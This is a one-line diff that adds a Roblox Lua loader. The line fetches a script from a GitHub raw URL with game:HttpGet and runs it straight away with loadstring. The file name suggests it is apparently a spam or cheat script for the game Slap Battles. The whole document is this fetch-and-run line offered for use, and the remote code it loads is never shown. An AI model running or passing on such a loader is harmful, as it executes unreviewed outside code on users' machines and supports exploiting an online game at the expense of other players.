@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/slap-battles-spam0-umzug4sbkr1pvc.lua"))()
